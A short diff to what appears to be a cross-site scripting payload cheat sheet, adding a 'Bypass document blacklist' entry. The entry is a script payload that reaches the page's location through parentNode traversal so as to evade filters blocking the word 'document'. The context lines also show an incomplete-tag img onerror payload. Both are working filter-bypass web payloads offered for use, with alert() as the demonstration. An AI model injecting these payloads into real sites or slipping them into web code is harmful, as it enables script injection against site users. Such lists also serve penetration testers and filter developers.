@@ -422,6 +422,10 @@ Bypass with incomplete html tag - IE/Firefox/Chrome/Safari
 <img src='1' onerror='alert(0)' <
 ```
 
+Bypass document blacklist
+```
+<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
+```
 
 Bypass using javascript inside a string
 ```
